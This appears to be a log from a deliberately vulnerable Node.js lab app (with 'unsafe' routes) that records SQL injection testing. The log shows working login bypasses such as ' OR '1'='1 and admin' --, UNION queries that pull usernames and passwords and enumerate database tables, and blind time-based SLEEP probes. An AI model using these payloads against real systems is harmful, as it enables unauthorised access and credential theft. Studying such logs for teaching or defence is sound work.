+18.12.2024, 02:35:45 [info]: [login] Login successful: username=admin' -- , sessionID=68cd2f3a-03c2-49f8-8585-18bf86255cbb
+18.12.2024, 02:35:45 [info]: [validateAndUpdateSession] Session updated successfully: ID=68cd2f3a-03c2-49f8-8585-18bf86255cbb
+18.12.2024, 02:35:45 [info]: [getUser] Retrieved username: admin for session ID: 68cd2f3a-03c2-49f8-8585-18bf86255cbb
+18.12.2024, 02:35:47 [info]: [validateAndUpdateSession] Session updated successfully: ID=68cd2f3a-03c2-49f8-8585-18bf86255cbb
+18.12.2024, 02:35:48 [info]: [deleteSession] Session deleted: ID=68cd2f3a-03c2-49f8-8585-18bf86255cbb
+18.12.2024, 02:35:48 [info]: [logout] Session deleted successfully: sessionID=68cd2f3a-03c2-49f8-8585-18bf86255cbb
+18.12.2024, 02:36:57 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:36:57 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:36:57 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:36:57 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:36:58 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:36:58 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:36:58 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:36:58 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:28 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:37:28 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:37:28 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:28 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:28 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:28 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:29 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:29 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:46 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:37:46 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:37:46 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:46 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:47 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:47 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:47 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:37:47 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:38:04 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:38:04 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:38:06 [info]: [login] Missing username or password
+18.12.2024, 02:38:16 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:38:17 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 02:38:17 [info]: [generateUUID] Generated UUID: c2cf77dd-57c2-44e3-9d92-9337774a11a3
+18.12.2024, 02:38:17 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 02:38:17 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 02:38:17 [info]: [generateSession] Session created: ID=c2cf77dd-57c2-44e3-9d92-9337774a11a3, user=admin
+18.12.2024, 02:38:17 [info]: [login] Login successful: username=admin, sessionID=c2cf77dd-57c2-44e3-9d92-9337774a11a3
+18.12.2024, 02:38:17 [info]: [validateAndUpdateSession] Session updated successfully: ID=c2cf77dd-57c2-44e3-9d92-9337774a11a3
+18.12.2024, 02:38:17 [info]: [getUser] Retrieved username: admin for session ID: c2cf77dd-57c2-44e3-9d92-9337774a11a3
+18.12.2024, 02:38:19 [info]: [validateAndUpdateSession] Session updated successfully: ID=c2cf77dd-57c2-44e3-9d92-9337774a11a3
+18.12.2024, 02:38:19 [info]: [deleteSession] Session deleted: ID=c2cf77dd-57c2-44e3-9d92-9337774a11a3
+18.12.2024, 02:38:19 [info]: [logout] Session deleted successfully: sessionID=c2cf77dd-57c2-44e3-9d92-9337774a11a3
+18.12.2024, 02:40:19 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:40:19 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:40:19 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:40:19 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:40:20 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:40:20 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:40:20 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:40:20 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%20'' at line 1
+18.12.2024, 02:40:20 [info]: [login] Missing username or password
+18.12.2024, 02:42:15 [info]: [validateLogin] User not found: username=user
+18.12.2024, 02:42:15 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 02:42:16 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:42:16 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 02:42:16 [info]: [generateUUID] Generated UUID: 92714598-a84f-40c2-bad6-01794a4e78d8
+18.12.2024, 02:42:16 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 02:42:16 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 02:42:16 [info]: [generateSession] Session created: ID=92714598-a84f-40c2-bad6-01794a4e78d8, user=admin' -- 
+18.12.2024, 02:42:16 [info]: [login] Login successful: username=admin' -- , sessionID=92714598-a84f-40c2-bad6-01794a4e78d8
+18.12.2024, 02:42:16 [info]: [validateLogin] User not found: username=user_xy' -- 
+18.12.2024, 02:42:16 [info]: [login] Unauthorized login attempt: username=user_xy' -- 
+18.12.2024, 02:42:17 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 02:42:17 [info]: [validateLogin] Login successful: username=elvis' -- 
+18.12.2024, 02:42:17 [info]: [generateUUID] Generated UUID: eff7a4dc-053c-474b-bfb0-f814727abea3
+18.12.2024, 02:42:17 [info]: [generateSession] Starting session creation for user: elvis' -- 
+18.12.2024, 02:42:17 [info]: [generateSession] Deleted 0 session(s) for user ID: 11
+18.12.2024, 02:42:18 [info]: [generateSession] Session created: ID=eff7a4dc-053c-474b-bfb0-f814727abea3, user=elvis' -- 
+18.12.2024, 02:42:18 [info]: [login] Login successful: username=elvis' -- , sessionID=eff7a4dc-053c-474b-bfb0-f814727abea3
+18.12.2024, 02:42:18 [info]: [login] Missing username or password
+18.12.2024, 08:25:19 [info]: Loading route file: route_account_management.js
+18.12.2024, 08:25:19 [info]: Loading route file: route_blog.js
+18.12.2024, 08:25:19 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 08:25:19 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 08:25:19 [info]: Server is running on http://localhost:3000
+18.12.2024, 08:25:19 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 08:25:20 [info]: Database connection established
+18.12.2024, 08:25:29 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:25:29 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 08:25:29 [info]: [generateUUID] Generated UUID: 2100d5bc-c5fd-4345-ba54-b499542a70e4
+18.12.2024, 08:25:29 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 08:25:29 [info]: [generateSession] Deleted 1 session(s) for user ID: 9
+18.12.2024, 08:25:29 [info]: [generateSession] Session created: ID=2100d5bc-c5fd-4345-ba54-b499542a70e4, user=admin
+18.12.2024, 08:25:29 [info]: [login] Login successful: username=admin, sessionID=2100d5bc-c5fd-4345-ba54-b499542a70e4
+18.12.2024, 08:25:30 [info]: [validateAndUpdateSession] Session updated successfully: ID=2100d5bc-c5fd-4345-ba54-b499542a70e4
+18.12.2024, 08:25:30 [info]: [getUser] Retrieved username: admin for session ID: 2100d5bc-c5fd-4345-ba54-b499542a70e4
+18.12.2024, 08:25:47 [info]: [validateAndUpdateSession] Session updated successfully: ID=2100d5bc-c5fd-4345-ba54-b499542a70e4
+18.12.2024, 08:25:47 [info]: [deleteSession] Session deleted: ID=2100d5bc-c5fd-4345-ba54-b499542a70e4
+18.12.2024, 08:25:47 [info]: [logout] Session deleted successfully: sessionID=2100d5bc-c5fd-4345-ba54-b499542a70e4
+18.12.2024, 08:30:13 [info]: [validateLogin] User not found: username=admin' -- 
+18.12.2024, 08:30:13 [info]: [login] Unauthorized login attempt: username=admin' -- 
+18.12.2024, 08:30:20 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:30:20 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 08:30:20 [info]: [generateUUID] Generated UUID: ca1de541-6bf0-4f80-ae92-5beb8306aadf
+18.12.2024, 08:30:20 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 08:30:21 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 08:30:21 [info]: [generateSession] Session created: ID=ca1de541-6bf0-4f80-ae92-5beb8306aadf, user=admin' -- 
+18.12.2024, 08:30:21 [info]: [login] Login successful: username=admin' -- , sessionID=ca1de541-6bf0-4f80-ae92-5beb8306aadf
+18.12.2024, 08:30:21 [info]: [validateAndUpdateSession] Session updated successfully: ID=ca1de541-6bf0-4f80-ae92-5beb8306aadf
+18.12.2024, 08:30:21 [info]: [getUser] Retrieved username: admin for session ID: ca1de541-6bf0-4f80-ae92-5beb8306aadf
+18.12.2024, 08:30:25 [info]: [validateAndUpdateSession] Session updated successfully: ID=ca1de541-6bf0-4f80-ae92-5beb8306aadf
+18.12.2024, 08:30:25 [info]: [deleteSession] Session deleted: ID=ca1de541-6bf0-4f80-ae92-5beb8306aadf
+18.12.2024, 08:30:25 [info]: [logout] Session deleted successfully: sessionID=ca1de541-6bf0-4f80-ae92-5beb8306aadf
+18.12.2024, 08:33:38 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:33:38 [info]: [validateLogin] Incorrect password: username=' OR '1'='1
+18.12.2024, 08:33:38 [info]: [login] Unauthorized login attempt: username=' OR '1'='1
+18.12.2024, 08:33:47 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:33:47 [info]: [validateLogin] Incorrect password: username=' OR '1'='1
+18.12.2024, 08:33:47 [info]: [login] Unauthorized login attempt: username=' OR '1'='1
+18.12.2024, 08:34:01 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:34:02 [info]: [validateLogin] Incorrect password: username=' OR '1'='1 
+18.12.2024, 08:34:02 [info]: [login] Unauthorized login attempt: username=' OR '1'='1 
+18.12.2024, 08:34:10 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:34:10 [info]: [validateLogin] Incorrect password: username=' OR '1'='1 
+18.12.2024, 08:34:10 [info]: [login] Unauthorized login attempt: username=' OR '1'='1 
+18.12.2024, 08:34:25 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:34:26 [info]: [validateLogin] Login successful: username=admin' OR '1'='1
+18.12.2024, 08:34:26 [info]: [generateUUID] Generated UUID: 4c6e08dc-4cdd-422a-9a30-fccfe80f9347
+18.12.2024, 08:34:26 [info]: [generateSession] Starting session creation for user: admin' OR '1'='1
+18.12.2024, 08:34:26 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 08:34:26 [info]: [generateSession] Session created: ID=4c6e08dc-4cdd-422a-9a30-fccfe80f9347, user=admin' OR '1'='1
+18.12.2024, 08:34:26 [info]: [login] Login successful: username=admin' OR '1'='1, sessionID=4c6e08dc-4cdd-422a-9a30-fccfe80f9347
+18.12.2024, 08:34:26 [info]: [validateAndUpdateSession] Session updated successfully: ID=4c6e08dc-4cdd-422a-9a30-fccfe80f9347
+18.12.2024, 08:34:27 [info]: [getUser] Retrieved username: admin for session ID: 4c6e08dc-4cdd-422a-9a30-fccfe80f9347
+18.12.2024, 08:34:30 [info]: [validateAndUpdateSession] Session updated successfully: ID=4c6e08dc-4cdd-422a-9a30-fccfe80f9347
+18.12.2024, 08:34:30 [info]: [deleteSession] Session deleted: ID=4c6e08dc-4cdd-422a-9a30-fccfe80f9347
+18.12.2024, 08:34:30 [info]: [logout] Session deleted successfully: sessionID=4c6e08dc-4cdd-422a-9a30-fccfe80f9347
+18.12.2024, 08:34:37 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:34:38 [info]: [validateLogin] Login successful: username=elvis' OR '1'='1
+18.12.2024, 08:34:38 [info]: [generateUUID] Generated UUID: a3495fea-7441-41fd-a0c9-756f6df1c230
+18.12.2024, 08:34:38 [info]: [generateSession] Starting session creation for user: elvis' OR '1'='1
+18.12.2024, 08:34:38 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 08:34:38 [info]: [generateSession] Session created: ID=a3495fea-7441-41fd-a0c9-756f6df1c230, user=elvis' OR '1'='1
+18.12.2024, 08:34:38 [info]: [login] Login successful: username=elvis' OR '1'='1, sessionID=a3495fea-7441-41fd-a0c9-756f6df1c230
+18.12.2024, 08:34:38 [info]: [validateAndUpdateSession] Session updated successfully: ID=a3495fea-7441-41fd-a0c9-756f6df1c230
+18.12.2024, 08:34:38 [info]: [getUser] Retrieved username: admin for session ID: a3495fea-7441-41fd-a0c9-756f6df1c230
+18.12.2024, 08:43:09 [info]: [validateAndUpdateSession] Session updated successfully: ID=a3495fea-7441-41fd-a0c9-756f6df1c230
+18.12.2024, 08:43:10 [info]: [getUser] Retrieved username: admin for session ID: a3495fea-7441-41fd-a0c9-756f6df1c230
+18.12.2024, 08:43:11 [info]: [validateAndUpdateSession] Session updated successfully: ID=a3495fea-7441-41fd-a0c9-756f6df1c230
+18.12.2024, 08:43:12 [info]: [deleteSession] Session deleted: ID=a3495fea-7441-41fd-a0c9-756f6df1c230
+18.12.2024, 08:43:12 [info]: [logout] Session deleted successfully: sessionID=a3495fea-7441-41fd-a0c9-756f6df1c230
+18.12.2024, 08:43:26 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:43:26 [info]: [validateLogin] Login successful: username=elvis' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 08:43:26 [info]: [generateUUID] Generated UUID: 012b356b-50bd-429b-9230-da1eb9e5da46
+18.12.2024, 08:43:26 [info]: [generateSession] Starting session creation for user: elvis' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 08:43:26 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 08:43:27 [info]: [generateSession] Session created: ID=012b356b-50bd-429b-9230-da1eb9e5da46, user=elvis' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 08:43:27 [info]: [login] Login successful: username=elvis' OR '1'='1' ORDER BY id ASC -- , sessionID=012b356b-50bd-429b-9230-da1eb9e5da46
+18.12.2024, 08:43:27 [info]: [validateAndUpdateSession] Session updated successfully: ID=012b356b-50bd-429b-9230-da1eb9e5da46
+18.12.2024, 08:43:27 [info]: [getUser] Retrieved username: admin for session ID: 012b356b-50bd-429b-9230-da1eb9e5da46
+18.12.2024, 08:43:29 [info]: [validateAndUpdateSession] Session updated successfully: ID=012b356b-50bd-429b-9230-da1eb9e5da46
+18.12.2024, 08:43:29 [info]: [deleteSession] Session deleted: ID=012b356b-50bd-429b-9230-da1eb9e5da46
+18.12.2024, 08:43:29 [info]: [logout] Session deleted successfully: sessionID=012b356b-50bd-429b-9230-da1eb9e5da46
+18.12.2024, 08:44:20 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:44:21 [info]: [validateLogin] Login successful: username=elvis' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 08:44:21 [info]: [generateUUID] Generated UUID: 899828df-07e6-4598-a2a4-d4c8ea2d076e
+18.12.2024, 08:44:21 [info]: [generateSession] Starting session creation for user: elvis' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 08:44:21 [info]: [generateSession] Deleted 1 session(s) for user ID: 11
+18.12.2024, 08:44:21 [info]: [generateSession] Session created: ID=899828df-07e6-4598-a2a4-d4c8ea2d076e, user=elvis' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 08:44:21 [info]: [login] Login successful: username=elvis' OR '1'='1' ORDER BY id DESC -- , sessionID=899828df-07e6-4598-a2a4-d4c8ea2d076e
+18.12.2024, 08:44:21 [info]: [validateAndUpdateSession] Session updated successfully: ID=899828df-07e6-4598-a2a4-d4c8ea2d076e
+18.12.2024, 08:44:21 [info]: [getUser] Retrieved username: elvis for session ID: 899828df-07e6-4598-a2a4-d4c8ea2d076e
+18.12.2024, 08:46:08 [info]: [validateAndUpdateSession] Session updated successfully: ID=899828df-07e6-4598-a2a4-d4c8ea2d076e
+18.12.2024, 08:46:08 [info]: [deleteSession] Session deleted: ID=899828df-07e6-4598-a2a4-d4c8ea2d076e
+18.12.2024, 08:46:08 [info]: [logout] Session deleted successfully: sessionID=899828df-07e6-4598-a2a4-d4c8ea2d076e
+18.12.2024, 08:46:12 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:46:12 [info]: [validateLogin] Login successful: username=asd' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 08:46:12 [info]: [generateUUID] Generated UUID: 3959431e-c93c-477f-9560-f8e73d6e8f34
+18.12.2024, 08:46:12 [info]: [generateSession] Starting session creation for user: asd' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 08:46:13 [info]: [generateSession] Deleted 0 session(s) for user ID: 11
+18.12.2024, 08:46:13 [info]: [generateSession] Session created: ID=3959431e-c93c-477f-9560-f8e73d6e8f34, user=asd' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 08:46:13 [info]: [login] Login successful: username=asd' OR '1'='1' ORDER BY id DESC -- , sessionID=3959431e-c93c-477f-9560-f8e73d6e8f34
+18.12.2024, 08:46:13 [info]: [validateAndUpdateSession] Session updated successfully: ID=3959431e-c93c-477f-9560-f8e73d6e8f34
+18.12.2024, 08:46:13 [info]: [getUser] Retrieved username: elvis for session ID: 3959431e-c93c-477f-9560-f8e73d6e8f34
+18.12.2024, 08:55:50 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:55:51 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 08:55:51 [info]: [generateUUID] Generated UUID: 17972192-0c9d-4a58-a1ad-f06afab6afd2
+18.12.2024, 08:55:51 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 08:55:51 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 08:55:51 [info]: [generateSession] Session created: ID=17972192-0c9d-4a58-a1ad-f06afab6afd2, user=admin
+18.12.2024, 08:55:51 [info]: [login] Login successful: username=admin, sessionID=17972192-0c9d-4a58-a1ad-f06afab6afd2
+18.12.2024, 08:55:51 [info]: [validateAndUpdateSession] Session updated successfully: ID=17972192-0c9d-4a58-a1ad-f06afab6afd2
+18.12.2024, 08:55:51 [info]: [getUser] Retrieved username: admin for session ID: 17972192-0c9d-4a58-a1ad-f06afab6afd2
+18.12.2024, 08:55:56 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT id, username, password FROM users -- %'
+        
+18.12.2024, 08:55:56 [info]: [unsafe_searchPosts] Query executed successfully, returned 6 result(s)
+18.12.2024, 08:56:41 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, @@version, 3 -- %'
+        
+18.12.2024, 08:56:41 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 08:57:14 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, DATABASE(), 3 -- %'
+        
+18.12.2024, 08:57:14 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 08:57:25 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, table_name, 3 FROM information_schema.tables -- %'
+        
+18.12.2024, 08:57:25 [info]: [unsafe_searchPosts] Query executed successfully, returned 332 result(s)
+18.12.2024, 08:58:13 [info]: [validateAndUpdateSession] Session updated successfully: ID=17972192-0c9d-4a58-a1ad-f06afab6afd2
+18.12.2024, 08:58:13 [info]: [deleteSession] Session deleted: ID=17972192-0c9d-4a58-a1ad-f06afab6afd2
+18.12.2024, 08:58:13 [info]: [logout] Session deleted successfully: sessionID=17972192-0c9d-4a58-a1ad-f06afab6afd2
+18.12.2024, 08:58:53 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 08:58:53 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 08:58:55 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 08:58:55 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 08:59:19 [info]: [validateLogin] User not found: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 08:59:19 [info]: [login] Unauthorized login attempt: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 08:59:30 [info]: [validateLogin] User not found: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 08:59:30 [info]: [login] Unauthorized login attempt: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 08:59:36 [info]: [validateLogin] User not found: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 08:59:36 [info]: [login] Unauthorized login attempt: username=admin' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 08:59:52 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 08:59:52 [info]: [validateLogin] Login successful: username=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 08:59:52 [info]: [generateUUID] Generated UUID: a01933b2-5ad4-4fde-9388-73a670a666e6
+18.12.2024, 08:59:52 [info]: [generateSession] Starting session creation for user: admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 08:59:53 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 08:59:53 [info]: [generateSession] Session created: ID=a01933b2-5ad4-4fde-9388-73a670a666e6, user=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 08:59:53 [info]: [login] Login successful: username=admin' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- , sessionID=a01933b2-5ad4-4fde-9388-73a670a666e6
+18.12.2024, 08:59:53 [info]: [validateAndUpdateSession] Session updated successfully: ID=a01933b2-5ad4-4fde-9388-73a670a666e6
+18.12.2024, 08:59:53 [info]: [getUser] Retrieved username: admin for session ID: a01933b2-5ad4-4fde-9388-73a670a666e6
+18.12.2024, 09:00:21 [info]: [validateAndUpdateSession] Session updated successfully: ID=a01933b2-5ad4-4fde-9388-73a670a666e6
+18.12.2024, 09:00:21 [info]: [deleteSession] Session deleted: ID=a01933b2-5ad4-4fde-9388-73a670a666e6
+18.12.2024, 09:00:21 [info]: [logout] Session deleted successfully: sessionID=a01933b2-5ad4-4fde-9388-73a670a666e6
+18.12.2024, 09:00:39 [info]: [validateLogin] User not found: username=xy' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:00:39 [info]: [login] Unauthorized login attempt: username=xy' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:00:41 [info]: [validateLogin] User not found: username=xy' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:00:41 [info]: [login] Unauthorized login attempt: username=xy' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:00:48 [info]: [validateLogin] User not found: username=xy' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:00:48 [info]: [login] Unauthorized login attempt: username=xy' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:01:04 [info]: [validateLogin] User not found: username=xy' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:01:04 [info]: [login] Unauthorized login attempt: username=xy' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:01:16 [info]: [validateLogin] User not found: username=xy' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 09:01:16 [info]: [login] Unauthorized login attempt: username=xy' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 09:01:24 [info]: [validateLogin] User not found: username=xy' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 09:01:24 [info]: [login] Unauthorized login attempt: username=xy' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 09:02:13 [info]: [validateLogin] User not found: username=user1' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:02:13 [info]: [login] Unauthorized login attempt: username=user1' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:02:21 [info]: [validateLogin] User not found: username=user1' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:02:21 [info]: [login] Unauthorized login attempt: username=user1' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:02:26 [info]: [validateLogin] User not found: username=user1' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:02:26 [info]: [login] Unauthorized login attempt: username=user1' AND IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 09:02:46 [info]: [validateLogin] User not found: username=user1' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 09:02:46 [info]: [login] Unauthorized login attempt: username=user1' AND ASCII(SUBSTRING(username, 1, 1)) = 97 -- 
+18.12.2024, 09:06:25 [info]: [validateLogin] User not found: username=' OR IF(ASCII(SUBSTRING(username, 1, 1)) = 97, SLEEP(3), 0) -- 
+18.12.2024, 09:06:25 [info]: [login] Unauthorized login attempt: username=' OR IF(ASCII(SUBSTRING(username, 1, 1)) = 97, SLEEP(3), 0) -- 
+18.12.2024, 09:08:19 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 09:08:19 [info]: [validateLogin] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 09:08:19 [info]: [generateUUID] Generated UUID: 048eddf0-4d88-4daf-b8d1-9a2db7ac501b
+18.12.2024, 09:08:19 [info]: [generateSession] Starting session creation for user: ' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 09:08:20 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 09:08:20 [info]: [generateSession] Session created: ID=048eddf0-4d88-4daf-b8d1-9a2db7ac501b, user=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
